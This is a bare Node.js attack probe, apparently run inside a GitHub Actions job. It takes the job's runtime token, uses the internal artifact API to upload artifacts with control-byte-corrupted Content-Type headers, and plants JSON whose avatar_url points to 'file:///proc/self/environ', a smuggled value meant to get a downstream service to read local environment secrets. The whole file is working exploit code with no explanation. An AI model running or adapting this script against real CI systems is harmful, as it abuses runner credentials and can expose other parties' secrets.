const fs = require('fs');
const crypto = require('crypto');
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8')).scp;
  const parts = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
  const runId = parts[1], jobId = parts[2];
  // raw control-byte CTs built HERE, never transported through workflow inputs
  const CTS = [
    ['x85', String.fromCharCode(0x85) + 'application/json'],
    ['x1f', String.fromCharCode(0x1f) + 'application/json'],
  ];
  const out = [];
  for (const [label, ct] of CTS) {
    const name = label + '.json';
    const cr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
      body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, mime_type: 'application/json', version: 7 })
    });
    const cj = await cr.json().catch(() => ({}));
    if (!cj.signedUploadUrl && !cj.signed_upload_url) { console.log(label, 'create', cr.status, JSON.stringify(cj).slice(0, 120)); continue; }
    const payload = Buffer.from('{"full_name":"' + label + '","owner":{"login":"u","avatar_url":"file:///proc/self/environ"}}');
    let putStatus = 'ERR';
    try {
      const pr = await fetch((cj.signedUploadUrl || cj.signed_upload_url), { method: 'PUT', headers: { 'Content-Type': ct, 'x-ms-blob-type': 'BlockBlob' }, body: payload });
      putStatus = String(pr.status);
    } catch (e) { putStatus = 'THROW:' + e.message.slice(0, 60); }
    console.log('CT', label, 'bytes=' + Buffer.from(ct, 'latin1').toString('hex'), 'PUT', putStatus);
    let artifactId = null;
    if (!putStatus.startsWith('THROW') && !putStatus.startsWith('ERR')) {
      try {
        const fr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
          body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, size: String(payload.length), hash: 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex') })
        });
        const fj = await fr.json().catch(() => ({}));
        artifactId = fj.artifact_id || fj.artifactId;
        console.log(label, 'finalize', fr.status, 'id', artifactId);
      } catch (e) { console.log(label, 'finalize throw', e.message.slice(0, 60)); }
    }
    out.push({ label, name, ctHex: Buffer.from(ct, 'latin1').toString('hex'), putStatus, artifactId });
  }
  fs.writeFileSync('/tmp/probe5_state.json', JSON.stringify(out, null, 2));
  console.log('DONE ' + out.filter(o => o.artifactId).length + ' artifacts');
})().catch(e => { console.log('ERR ' + e.message); process.exit(1); });
